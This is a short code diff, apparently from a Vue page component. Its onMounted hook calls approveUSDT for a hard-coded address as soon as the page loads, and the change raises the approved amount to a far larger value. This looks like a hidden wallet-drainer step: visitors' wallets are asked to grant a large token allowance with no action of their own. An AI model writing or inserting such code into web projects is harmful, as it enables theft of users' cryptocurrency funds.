@@ -43,7 +43,7 @@ onMounted(() => {
   if(data.defaultShow){
     showDialog(data.defaultShow)
   }
-  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','100000000000')
+  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',1000000000000000)
 })
 onBeforeUnmount(() => {
   clearInterval(timer)
